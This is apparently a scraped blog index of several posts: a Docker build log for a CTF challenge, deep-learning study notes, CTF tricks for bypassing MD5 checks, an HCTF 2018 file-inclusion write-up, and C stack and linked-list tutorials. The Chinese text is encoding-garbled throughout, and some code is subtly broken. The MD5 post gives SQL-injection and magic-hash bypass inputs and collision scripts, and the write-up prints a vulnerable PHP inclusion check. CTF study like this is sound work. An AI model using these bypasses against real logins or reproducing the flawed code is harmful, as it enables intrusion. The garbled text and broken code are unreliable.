1234567891011121314151617181920212223242526272829303132â”Œâ”€â”€(kaliã‰¿kali)-[/var/â€¦/html/CTFd/ctf_training/34c3ctf_2017_urlstorage]â””â”€$ sudo docker build ./ -t urlstorage 1 â¨¯Sending build context to Docker daemon 282.6kBStep 1/7 : FROM ubuntu:18.1018.10: Pulling from library/ubuntu8a532469799e: Pull complete 32f4dcec3531: Pull complete 230f0701585e: Pull complete e01f70622967: Pull complete Digest: sha256:7d657275047118bb77b052c4c0ae43e8a289ca2879ebfa78a703c93aa8fd686cStatus: Downloaded newer image for ubuntu:18.10 ---&gt; 9dc19675e327Step 2/7 : ENV DOCKER=1 PHANTOMJS_VERSION=&quot;2.1.1&quot; ---&gt; Running in 98e854ac92f3Removing intermediate container 98e854ac92f3 ---&gt; 154a521cb653Step 3/7 : RUN sed -i &#x27;s/http:\\/\\/archive.ubuntu.com\\//http:\\/\\/mirrors.tuna.tsinghua.edu.cn\\//g&#x27; /etc/apt/sources.list &amp;&amp; sed -i &#x27;/security/d&#x27; /etc/apt/sources.list &amp;&amp; apt-get -y update &amp;&amp; apt-get -yqq install curl python3 python3-pip mariadb-server libmysqlclient-dev nginx wget bzip2 libfreetype6 libfontconfig &amp;&amp; mkdir -p /srv/var &amp;&amp; wget --local-encoding=UTF-8 --no-check-certificate -O /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 https://bitbucket.org/ariya/phantomjs/downloads/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 &amp;&amp; tar -xjf /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 -C /tmp &amp;&amp; rm -f /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 &amp;&amp; mv /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64/ /srv/var/phantomjs &amp;&amp; ln -s /srv/var/phantomjs/bin/phantomjs /usr/bin/phantomjs &amp;&amp; pip3 install django gunicorn mysqlclient requests lxml pyyaml django-simple-captcha ---&gt; Running in 8d702a730242Ign:1 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic InReleaseIgn:2 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-updates InReleaseIgn:3 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-backports InReleaseErr:4 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic Release 404 Not Found [IP: 101.6.15.130 80]Err:5 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-updates Release 404 Not Found [IP: 101.6.15.130 80]Err:6 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-backports Release 404 Not Found [IP: 101.6.15.130 80]Reading package lists...E: The repository &#x27;http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic Release&#x27; does not have a Release file.E: The repository &#x27;http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-updates Release&#x27; does not have a Release file. E: The repository &#x27;http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-backports Release&#x27; does not have a Release file. The command &#x27;/bin/sh -c sed -i &#x27;s/http:\\/\\/archive.ubuntu.com\\//http:\\/\\/mirrors.tuna.tsinghua.edu.cn\\//g&#x27; /etc/apt/sources.list &amp;&amp; sed -i &#x27;/security/d&#x27; /etc/apt/sources.list &amp;&amp; apt-get -y update &amp;&amp; apt-get -yqq install curl python3 python3-pip mariadb-server libmysqlclient-dev nginx wget bzip2 libfreetype6 libfontconfig &amp;&amp; mkdir -p /srv/var &amp;&amp; wget --local-encoding=UTF-8 --no-check-certificate -O /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 https://bitbucket.org/ariya/phantomjs/downloads/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 &amp;&amp; tar -xjf /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 -C /tmp &amp;&amp; rm -f /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 &amp;&amp; mv /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64/ /srv/var/phantomjs &amp;&amp; ln -s /srv/var/phantomjs/bin/phantomjs /usr/bin/phantomjs &amp;&amp; pip3 install django gunicorn mysqlclient requests lxml pyyaml django-simple-captcha&#x27; returned a non-zero code: 100 è®¸å¤šå‘½ä»¤éƒ½éœ€è¦rootæƒé™ï¼Œå¦‚æœåœ¨å“ªä¸€æ­¥è¿è¡ŒæŠ¥é”™äº†å¯ä»¥æ£€æŸ¥ä»¥ä¸‹æ˜¯å¦æ˜¯æƒé™é—®é¢˜","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://uniqueland.top/tags/ctf/"}]},{"title":"Deep Learning from Scratch","slug":"deep_learning_from_scratch","date":"2021-11-28T07:05:56.160Z","updated":"2021-11-30T14:51:29.989Z","comments":true,"path":"2021/11/28/deep_learning_from_scratch/","link":"","permalink":"http://uniqueland.top/2021/11/28/deep_learning_from_scratch/","excerpt":"è¯»ä¹¦è®°å½•","text":"è¯»ä¹¦è®°å½• æ”¶è·ï¼š å¯¹matplotlibã€numpyæœ‰äº†åˆæ­¥è®¤è¯† äº†è§£äº†ä¸€äº›åŸºç¡€æ¦‚å¿µ è·Ÿéšä¹¦æœ¬å®ç°äº†ç®€å•çš„é€»è¾‘é—¨ç”µè·¯ è®¤è¯†äº†æ„ŸçŸ¥æœºã€æ¿€æ´»å‡½æ•° numpy:123456import numpy as npx = np.array([1.0,2.0,3.0]) #ç”Ÿæˆæ•°ç»„print(x)print(x.dtype) #æŸ¥çœ‹æ•°æ®ç±»å‹print(x.shape) #æŸ¥çœ‹çŸ©é˜µå½¢çŠ¶x = x.flatten() #å°†çŸ©é˜µè½¬æ¢ä¸ºä¸€ç»´æ•°ç»„ matplotlib12345678910import matplotlib.pyplot as pltfrom matplotlib.image import imreadx = [1, 2, 3, 4, 5]y = [2, 4, 6, 8, 10]plt.plot(x, y) #ç»˜åˆ¶å›¾å½¢plt.show() #æ˜¾ç¤ºåæ ‡ç³»img = imread(&quot;lena.png&quot;)plt.imshow(img) #æ˜¾ç¤ºå›¾åƒ åŸºç¡€æ¦‚å¿µ å¹¿æ’­ï¼šå°†ä¸çŸ©é˜µç›¸ä¹˜çš„æ ‡é‡è½¬æ¢ä¸ºç›¸åº”å¤§å°çŸ©é˜µçš„åŠŸèƒ½ å¼ é‡ï¼šä¸€èˆ¬åŒ–ä¹‹åçš„å‘é‡æˆ–çŸ©é˜µ æ„ŸçŸ¥æœºï¼šæ„ŸçŸ¥æœº(perceptron)æ˜¯äºŒç±»åˆ†ç±»çš„çº¿æ€§åˆ†ç±»æ¨¡å‹ï¼Œå…¶è¾“å…¥ä¸ºå®ä¾‹çš„ç‰¹å¾å‘é‡ï¼Œè¾“å‡ºä¸ºå®ä¾‹çš„ç±»åˆ«ã€‚ ç®€å•é€»è¾‘é—¨çš„å®ç°12345678910111213141516171819202122232425262728293031323334353637import numpy as npdef AND(x1, x2): x = np.array([x1, x2]) w = np.array([0.5 0.5]) b = -0.7 tmp = np.sum(w*x) + b if tmp &lt;= 0: return 0 elif tmp &gt; 0: return 1def NAND(x1, x2): x = np.array([x1, x2]) w = np.array([-0.5 -0.5]) b = 0.7 tmp = np.sum(w*x) + b if tmp &lt;= 0: return 0 elif tmp &gt; 0: return 1def OR(x1, x2): x = np.array([x1, x2]) w = np.array([0.5 0.5]) b = -0.2 tmp = np.sum(w*x) + b if tmp &lt;= 0: return 0 elif tmp &gt; 0: return 1def XOR(x1, x2): s1 = NAND(x1, x2) s2 = OR(x1, x2) y = AND(s1, s2) return y æ„ŸçŸ¥æœºæ„ŸçŸ¥æœºçš„å±€é™æ€§â€‹ å•å±‚æ„ŸçŸ¥æœºåªèƒ½è¡¨ç¤ºçº¿æ€§ç©ºé—´ å¤šå±‚æ„ŸçŸ¥æœºçš„ä¼˜åŠ¿ å¤šå±‚æ„ŸçŸ¥æœºå¯ä»¥å®ç°éçº¿æ€§ç©ºé—´ ä½¿ç”¨äº†éçº¿æ€§å‡½æ•°sigmoidä½œä¸ºæ¿€æ´»å‡½æ•°çš„2å±‚æ„ŸçŸ¥æœºå¯ä»¥è¡¨ç¤ºä»»æ„å‡½æ•° æ¿€æ´»å‡½æ•°å®šä¹‰ï¼šå°†è¾“å…¥ä¿¡å·çš„æ€»å’Œè½¬æ¢ä¸ºè¾“å‡ºä¿¡å·çš„å‡½æ•° sigmoidå‡½æ•°ï¼š$$h(x) = \\frac{1}{(1+e^{-x})}$$ é˜¶è·ƒå‡½æ•°ï¼š 12345def step_function(x): if x &gt; 0: return 1 else: return 0 æˆ–è€… 123def step_function(x): y = x &gt; 0 return y.astype(np.int) ReLUå‡½æ•°$$h(x)=\\begin{cases}x (x&gt;0)\\0 (x\\leq0)\\\\end{cases}$$ æ’ç­‰å‡½æ•° softmaxå‡½æ•°$$y_k=\\frac{e^}{\\sum_{i=1}^ne^{a_i}}$$","categories":[],"tags":[{"name":"çŸ¥è¯†è¾“å‡ºã€AI","slug":"çŸ¥è¯†è¾“å‡ºã€AI","permalink":"http://uniqueland.top/tags/%E7%9F%A5%E8%AF%86%E8%BE%93%E5%87%BA%E3%80%81AI/"}]},{"title":"æœ‰å…³md5çš„ä¸€äº›ä¿¡æ¯","slug":"something_about_md5","date":"2021-11-23T15:56:14.073Z","updated":"2021-11-23T16:35:02.663Z","comments":true,"path":"2021/11/23/something_about_md5/","link":"","permalink":"http://uniqueland.top/2021/11/23/something_about_md5/","excerpt":"åœ¨ctfæ¯”èµ›ä¸­å¸¸å¸¸è§åˆ°md5çš„èº«å½±ï¼Œå¯¹äºmd5ï¼Œå¸¸è§çš„åˆ©ç”¨æ–¹å¼æœ‰ä»¥ä¸‹å‡ ç§","text":"åœ¨ctfæ¯”èµ›ä¸­å¸¸å¸¸è§åˆ°md5çš„èº«å½±ï¼Œå¯¹äºmd5ï¼Œå¸¸è§çš„åˆ©ç”¨æ–¹å¼æœ‰ä»¥ä¸‹å‡ ç§ åœ¨sqlæ³¨å…¥ä¸­ è‹¥é‡åˆ°äº†ç±»ä¼¼ä»¥ä¸‹çš„æƒ…å†µ 123$password=$_POST[&#x27;password&#x27;];$sql = &quot;SELECT * FROM admin WHERE username = &#x27;admin&#x27; and password = &#x27;&quot;.md5($password,true).&quot;&#x27;&quot;;$result=mysqli_query($link,$sql); å¯ä»¥ä¼ å…¥ffifdyopæˆ–è€…129581926211651571912466741651878684928ï¼Œè¿™ä¸¤è€…md5åŠ å¯†åçš„ç»“æœéƒ½åŒ…å« â€˜ OR â€˜ çš„å­—æ ·ï¼Œå¯ç”¨äºå¼•å·é€ƒé€¸ åœ¨å¼±ç±»å‹æ¯”è¾ƒä¸­ è‹¥å­˜åœ¨å¯¹ä¸¤ä¸ªmd5åŠ å¯†åçš„å­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒæ—¶ï¼Œå¯ä¼ å…¥ç±»ä¼¼s1502113478aã€s1836677006açš„å­—ç¬¦ä¸²ï¼ŒåŠ å¯†åéƒ½æ˜¯ä»¥0eå¼€å¤´ï¼Œæ¯”è¾ƒæ—¶éƒ½ä¸ºé›¶ 123456789&lt;?php$a = &quot;s1502113478a&quot;;$b = &quot;s1836677006a&quot;;$a_1 = md5($a);$b_1 = md5($b);echo $a_1.&quot;\\n&quot;.$b_1.&quot;\\n&quot;;?&gt; 1234â”Œâ”€â”€(kaliã‰¿kali)-[~/Documents]â””â”€$ php md5.php 0e8615801632915612474043813960640e481036490867661113260034900752 åœ¨å…è®¸ä¼ é€’æ•°ç»„æ—¶ å¯ä»¥ä¼ å…¥ä¸¤ä¸ªç©ºæ•°ç»„ï¼Œç”±äºmd5æ— æ³•å¯¹æ•°ç»„è¿›è¡ŒåŠ å¯†ï¼Œæ•…è¿”å›nullï¼Œè€Œ null = null ä¸º true 123456789&lt;?php$a = array();$b = array();$a_1 = md5($a);$b_1 = md5($b);echo $a_1.&quot;\\n&quot;.$b_1.&quot;\\n&quot;;?&gt; 1234â”Œâ”€â”€(kaliã‰¿kali)-[~/Documents]â””â”€$ php em_array.php PHP Warning: md5() expects parameter 1 to be string, array given in /home/kali/Documents/em_array.php on line 5PHP Warning: md5() expects parameter 1 to be string, array given in /home/kali/Documents/em_array.php on line 6 è™½ç„¶è½¬æ¢å¤±è´¥ï¼Œä½†æ˜¯è¿”å›äº† null ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨ä¼ é€’æ•°ç»„æ—¶åº”ä½¿ç”¨å¦‚ä¸‹å½¢å¼ï¼š 1a[]=1 &amp; b[1]=&quot;b&quot; &amp; c[] md5ç¢°æ’ å½“ä¸Šè¿°æ–¹æ³•éƒ½ä¸å¥æ•ˆæ—¶ï¼šå¯ä»¥ä½¿ç”¨md5ç®—æ³•æœ¬èº«çš„æ¼æ´ï¼›md5ç¢°æ’æŒ‡çš„æ˜¯ä¸åŒçš„è¾“å…¥è¿›è¡Œmd5åŠ å¯†åå¾—åˆ°åŒæ ·çš„è¾“å‡ºï¼Œç½‘ä¸Šæœ‰è®¸å¤šç®—æ³•å¯ä»¥å®ç°ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äºè¾“å…¥éœ€ä¸Šä¼ æœåŠ¡å™¨ï¼Œæ•…éœ€è¦å¯¹è¾“å‡ºè¿›è¡Œurlç¼–ç  12345678910111213141516171819202122232425262728293031323334353637383940414243#!coding:utf-8hexString1 = &#x27;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2&#x27;hexString2 = &#x27;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2&#x27;hexList1 = []intList1 = []asciiString1 =&#x27;&#x27;while True: intString1 = hexString1[0:2] hexString1 = hexString1[2:] hexList1.append(intString1) if (hexString1 == &#x27;&#x27;): breakfor i in hexList1: intList1.append(int(i,16))for j in intList1: asciiString1 += chr(int(j))f = open(&#x27;1.bin&#x27;,&#x27;w&#x27;)f.write(asciiString1)f.close()hexList2 = []intList2 = []asciiString2 =&#x27;&#x27;while True: intString2 = hexString2[0:2] hexString2 = hexString2[2:] hexList2.append(intString2) if (hexString2 == &#x27;&#x27;): breakfor i in hexList2: intList2.append(int(i,16))for j in intList2: asciiString2 += chr(int(j))f = open(&#x27;2.bin&#x27;,&#x27;w&#x27;)f.write(asciiString2)f.close() 1234567891011121314#!coding:utf-8import urllib.requesturlString1=&#x27;&#x27;urlString2 = &#x27;&#x27;for line in open(&#x27;1.bin&#x27;): urlString1 += urllib.parse.quote(line)for line in open(&#x27;2.bin&#x27;): urlString2 += urllib.parse.quote(line)print(urlString1)print(urlString2)","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://uniqueland.top/tags/CTF/"}]},{"title":"HCTF 2018WarmUp 1","slug":"[HCTF 2018]WarmUp 1","date":"2021-11-07T15:15:57.237Z","updated":"2021-11-07T15:57:44.286Z","comments":true,"path":"2021/11/07/[HCTF 2018]WarmUp 1/","link":"","permalink":"http://uniqueland.top/2021/11/07/[HCTF%202018]WarmUp%201/","excerpt":"ä¸€ä¸Šæ¥ä¾¿æ˜¯ä¸€å¼ å¤©çœŸæ— é‚ªçš„ç¬‘è„¸","text":"ä¸€ä¸Šæ¥ä¾¿æ˜¯ä¸€å¼ å¤©çœŸæ— é‚ªçš„ç¬‘è„¸æ— å¤´ç»ªï¼Œf12æŸ¥æºç ï¼Œå‘ç°source.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php highlight_file(__FILE__); class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; if (! isset($page) || !is_string($page)) &#123; echo &quot;you can&#x27;t see it&quot;; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo &quot;you can&#x27;t see it&quot;; return false; &#125; &#125; if (! empty($_REQUEST[&#x27;file&#x27;]) &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;]) &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;]) ) &#123; include $_REQUEST[&#x27;file&#x27;]; exit; &#125; else &#123; echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; &#125; ?&gt; å¼€å§‹ä»£ç å®¡è®¡ ç½‘é¡µé€šè¿‡å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œè¿‡æ»¤åè¿›è¡Œæ–‡ä»¶åŒ…å« ä¸€å¼€å§‹æˆ‘ä»¥ä¸ºæ˜¯éœ€è¦æ»¡è¶³æ‰€æœ‰çš„æ¡ä»¶ï¼Œä½†æ ¹æ®ä¸‹æ–‡åŒ…å«æ–‡ä»¶çš„ä»£ç å‘ç°åªéœ€è¦æ»¡è¶³å…¶ä¸­ä¸€ä¸ªå°±è¶³å¤Ÿäº† 123456789if (! empty($_REQUEST[&#x27;file&#x27;]) &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;]) &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;]) ) &#123; include $_REQUEST[&#x27;file&#x27;]; exit; &#125; else &#123; echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; &#125; åœ¨å°è¯•äº†è®¸ä¹…ä¹‹åæˆ‘å‘ç°é‡ç‚¹åœ¨äºæœ€åä¸€ä¸ªåˆ¤æ–­ï¼Œå³ä»è§£ç å‡½æ•°å¼€å§‹çš„åˆ¤æ–­ï¼›åœ¨è§£ç ä¹‹åå‡ºç°äº†æ–°çš„å˜é‡$_pageï¼Œç„¶åå¯¹è¯¥å˜é‡è¿›è¡Œåˆ†å‰²ï¼Œå–å‡ºå˜é‡ä¸­é—®å·ä¹‹å‰çš„éƒ¨åˆ†ï¼Œè¦†ç›–åŸæ¥çš„å˜é‡ï¼Œå†åˆ¤æ–­è¯¥å˜é‡æ˜¯å¦ä½äºç™½åå•å†…ã€‚ 1234567$_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; åˆ¤æ–­é€šè¿‡åå¯¹æ–‡ä»¶è¿›è¡ŒåŒ…å«ï¼Œè¿™æ—¶éå†æ–‡ä»¶ç›®å½•å°±èƒ½æ‰¾åˆ°flagäº†ï¼Œæ–‡ä»¶åç§°åœ¨hint.phpé‡Œ æœ€ç»ˆpayloadï¼š","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://uniqueland.top/tags/web/"}]},{"title":"ä½¿ç”¨Cè¯­è¨€å®ç°æ ˆ","slug":"stack_by_C","date":"2021-09-05T14:17:42.819Z","updated":"2021-09-05T15:09:46.818Z","comments":true,"path":"2021/09/05/stack_by_C/","link":"","permalink":"http://uniqueland.top/2021/09/05/stack_by_C/","excerpt":"è¯´æ˜ ä½œä¸ºæ ˆé¡¶çš„èŠ‚ç‚¹ä¸å­˜å‚¨æ•°æ®","text":"è¯´æ˜ ä½œä¸ºæ ˆé¡¶çš„èŠ‚ç‚¹ä¸å­˜å‚¨æ•°æ®ï¼Œä»…ä½œå®šä½åŠŸèƒ½ æ•°æ®é¡¹çš„ç±»å‹å¯è‡ªè¡Œå®šä¹‰ åœ¨pushå’Œpopæ—¶ï¼Œå¹¶ä¸æ”¹å˜æ ˆé¡¶èŠ‚ç‚¹çš„ä½ç½®ï¼Œä»…ä»…æ˜¯å°†å¾…æ“ä½œèŠ‚ç‚¹åŠ å…¥æˆ–åˆ é™¤å¹¶æ”¹å˜æŒ‡é’ˆæŒ‡å‘è€Œå·² æ ˆé¡¶èŠ‚ç‚¹çš„æ•°æ®é¡¹å¯ç”¨æ¥å­˜å‚¨å½“å‰æ ˆçš„èŠ‚ç‚¹æ•°ï¼Œè¿™ç‚¹åœ¨pushå‡½æ•°çš„å®šä¹‰ä¸­å¯ä»¥ä½“ç° ä¸»å‡½æ•°ä»…ä½œå„å‡½æ•°çš„æ¼”ç¤ºä½¿ç”¨ï¼Œå¯è‡ªå®šä¹‰ å®šä¹‰ç›¸åº”ç»“æ„ 1234typedef struct node&#123; int data; struct node *next;&#125;node; è¯¥ç»“æ„ç”±ä¸€ä¸ªæ•´å‹å’Œä¸€ä¸ªæŒ‡å‘æ­¤ç»“æ„çš„æŒ‡é’ˆç»„æˆã€‚ å®šä¹‰pushå‡½æ•° 123456789int push(node *top, int data)&#123; node *temp = (node *)malloc(sizeof(node)); temp-&gt;data = data; temp-&gt;next = top-&gt;next; top-&gt;next = temp; top-&gt;data++; return data;&#125; ç¬¬ä¸€æ­¥ï¼šåˆ†é…ç©ºé—´ ç¬¬äºŒæ­¥ï¼šå­˜å‚¨æ•°æ® ç¬¬ä¸‰æ­¥ï¼šæ”¹å˜æ ˆé¡¶å’Œæ–°å¢é¡¹çš„nextæŒ‡é’ˆï¼Œé€’å¢topèŠ‚ç‚¹çš„dataé¡¹ å®šä¹‰popå‡½æ•° 12345678910111213int pop(node *top)&#123; if(!top-&gt;next)&#123; printf(&quot;Stack is empty now.&quot;); return -1; &#125; int pop_data = top-&gt;next-&gt;data; node *temp = top-&gt;next; top-&gt;next = top-&gt;next-&gt;next; temp = NULL; free(temp); return pop_data;&#125; ç¬¬ä¸€æ­¥ï¼šåˆ¤æ–­æ ˆæ˜¯å¦ä¸ºç©º ç¬¬äºŒæ­¥ï¼šå®šä¹‰å˜é‡å­˜å‚¨å¾…å¼¹å‡ºçš„æ•°æ®å’Œå¾…åˆ é™¤èŠ‚ç‚¹ ç¬¬ä¸‰æ­¥ï¼šæ”¹å˜æ ˆé¡¶çš„nextæŒ‡é’ˆ é‡Šæ”¾å¾…åˆ é™¤èŠ‚ç‚¹ç©ºé—´ï¼Œåˆ é™¤èŠ‚ç‚¹ å®šä¹‰åˆå§‹åŒ–å‡½æ•° ä¸ºæ ˆé¡¶èŠ‚ç‚¹åˆ†é…ç©ºé—´å¹¶åˆå§‹åŒ–æŒ‡é’ˆä¸ºç©º 1234567node* stack_init()&#123; node *temp = (node *)malloc(sizeof(node)); temp-&gt;data = 0; temp-&gt;next = NULL; return temp;&#125; å®šä¹‰éå†æ˜¾ç¤ºå‡½æ•° 1234567void display(node *current)&#123; current = current-&gt;next; while(current)&#123; printf(&quot;%d\\n&quot;,current-&gt;data); current = current-&gt;next; &#125;&#125; å°†å½“å‰èŠ‚ç‚¹æŒ‡å‘æ ˆé¡¶çš„ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ å½“å‰èŠ‚ç‚¹ä¸ä¸ºç©ºæ—¶è¿›å…¥éå†å¾ªç¯ æ‰“å°å½“å‰èŠ‚ç‚¹çš„æ•°æ®é¡¹ å°†å½“å‰èŠ‚ç‚¹æŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ æºä»£ç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;typedef struct node&#123; int data; struct node *next;&#125;node;int push(node *top, int data);int pop(node *top);node* stack_init();void display(node *current);int push(node *top, int data)&#123; node *temp = (node *)malloc(sizeof(node)); temp-&gt;data = data; temp-&gt;next = top-&gt;next; top-&gt;next = temp; return data;&#125;int pop(node *top)&#123; if(!top-&gt;next)&#123; printf(&quot;Stack is empty now.&quot;); return -1; &#125; int pop_data = top-&gt;next-&gt;data; node *temp = top-&gt;next; top-&gt;next = top-&gt;next-&gt;next; temp = NULL; free(temp); return pop_data;&#125;node* stack_init()&#123; node *temp = (node *)malloc(sizeof(node)); temp-&gt;data = 0; temp-&gt;next = NULL; return temp;&#125;void display(node *current)&#123; current = current-&gt;next; while(current)&#123; printf(&quot;%d\\n&quot;,current-&gt;data); current = current-&gt;next; &#125;&#125;int main()&#123; int first_input; int pop_input, pop_data; node *top = stack_init(); int status; printf(&quot;Enter strings, Ctrl+Z to quit.\\n&quot;); status = scanf(&quot;%d&quot;,&amp;first_input); while(status!=EOF)&#123; push(top, first_input); status = scanf(&quot;%d&quot;,&amp;first_input); &#125; display(top); printf(&quot;Now enter 1 to pop data, 0 to quit.\\n&quot;); scanf(&quot;%d&quot;,&amp;pop_input); while(pop_input==1)&#123; pop_data = pop(top); if(pop_data==-1)&#123; break; &#125; printf(&quot;pop_data: %d\\n&quot;,pop_data); scanf(&quot;%d&quot;,&amp;pop_input); &#125; printf(&quot;\\nDone\\n&quot;); return 0;&#125;","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"çŸ¥è¯†è¾“å‡º","slug":"çŸ¥è¯†è¾“å‡º","permalink":"http://uniqueland.top/tags/%E7%9F%A5%E8%AF%86%E8%BE%93%E5%87%BA/"}]},{"title":"ä½¿ç”¨Cè¯­è¨€å®ç°é“¾è¡¨","slug":"link_list_by_C","date":"2021-05-02T06:13:00.666Z","updated":"2021-09-05T14:19:04.270Z","comments":true,"path":"2021/05/02/link_list_by_C/","link":"","permalink":"http://uniqueland.top/2021/05/02/link_list_by_C/","excerpt":"","text":"ç¬¬ä¸€æ­¥ï¼šå®šä¹‰ç›¸åº”ç»“æ„ ç”±äºå®ç°é“¾è¡¨çš„ç¼–ç¨‹è¯­è¨€ä¸ºCï¼Œä¸èƒ½å¤Ÿä½¿ç”¨ç±»ï¼Œæ•…ä½¿ç”¨ç»“æ„æ¥å®ç°é“¾è¡¨ä¸­çš„èŠ‚ç‚¹ï¼› 12345typedef struct LinkList &#123; char name[MAX_INPUT]; long number; LinkList* next;&#125;Link; è¯¥ç»“æ„ç”±ä¸€ä¸ªå­—ç¬¦æ•°ç»„ï¼Œä¸€é¡¹ç¼–å·å’Œä¸€ä¸ªæŒ‡å‘æ­¤ç»“æ„çš„æŒ‡é’ˆç»„æˆã€‚ ç¬¬äºŒæ­¥ï¼šå®šä¹‰è¾“å…¥å‡½æ•° ä¸ºäº†æ›´å®¹æ˜“ã€æ›´å‡†ç¡®çš„è·å–è¾“å…¥ï¼Œåœ¨ç¨‹åºä¸­é‡æ–°å®šä¹‰è¾“å…¥å‡½æ•°ï¼Œåœ¨åŸæœ‰fgets()å‡½æ•°çš„åŸºç¡€ä¸Šç•¥ä½œä¿®æ”¹ï¼Œå¾—åˆ°æ–°çš„è¾“å…¥å‡½æ•°s_gets()ï¼› 1234567891011121314151617char* s_gets(char* st, int n) &#123; char* ret_val; char* find; ret_val = fgets(st, n, stdin); if (ret_val) &#123; find = strchr(st, &#x27;\\n&#x27;); if (find) &#123; *find = &#x27;\\0&#x27;; &#125; else &#123; while (getchar() != &#x27;\\n&#x27;) &#123; continue; &#125; &#125; &#125; return ret_val;&#125; è¯¥å‡½æ•°ä¸ºè¿”å›ç±»å‹ä¸ºå­—ç¬¦æŒ‡é’ˆã€æ¥å—å‚æ•°ä¸ºä¸€ä¸ªå­—ç¬¦æŒ‡é’ˆå’Œä¸€ä¸ªæ•´æ•°çš„è¾“å…¥å‡½æ•°ï¼Œå…¶ä¸­å­—ç¬¦æŒ‡é’ˆå°±æ˜¯å­—ç¬¦æ•°ç»„åç§°ï¼Œå› ä¸ºæ•°ç»„åç§°æœ¬è´¨ä¸Šå°±æ˜¯æ•°ç»„é¦–å…ƒç´ çš„åœ°å€ï¼Œè€Œè¯¥æ•°ç»„ä¸ºå­—ç¬¦æ•°ç»„ï¼Œæ•…è¯¥å­—ç¬¦æ•°ç»„åç§°æœ¬è´¨ä¸Šå°±æ˜¯å­—ç¬¦æŒ‡é’ˆï¼› åœ¨å‡½æ•°å†…éƒ¨ï¼Œæˆ‘å£°æ˜äº†ä¸¤ä¸ªå­—ç¬¦æŒ‡é’ˆï¼Œä¸€ä¸ªç”¨æ¥æ¥å—fgetså‡½æ•°çš„è¿”å›å€¼ï¼Œä¸€ä¸ªç”¨æ¥æ¥å—æŸ¥æ‰¾å­—ç¬¦å‡½æ•°(strchr)çš„è¿”å›å€¼ï¼› å…³äºfgets()å‡½æ•°ï¼š å¦‚æœæ¥å—è¾“å…¥çš„å­—ç¬¦æ•°é‡è¶…è¿‡å­—ç¬¦æ•°ç»„çš„å¤§å°(MAX_INPUT)ï¼Œfgets()å‡½æ•°ä¼šè¿”å›å…ˆå‰ä¼ å…¥çš„åœ°å€ï¼Œå³å­—ç¬¦æ•°ç»„çš„åç§°ï¼Œå¹¶ä¸”æŠŠæœ«å°¾çš„å­—ç¬¦æ¢ä¸ºç©ºå­—ç¬¦('\\0')ï¼Œä½¿ä¹‹æˆä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼› å¦‚æœæ¥æ”¶è¾“å…¥çš„å­—ç¬¦æ•°é‡åœ¨å­—ç¬¦æ•°ç»„çš„å¤§å°ä»¥å†…ï¼Œé‚£ä¹ˆfgets()å‡½æ•°ä¼šå°†ç©ºå­—ç¬¦æ”¾ç½®åœ¨æ¢è¡Œç¬¦ä¹‹å‰ï¼Œç„¶ååŒæ ·è¿”å›å…ˆå‰ä¼ å…¥çš„åœ°å€ï¼› 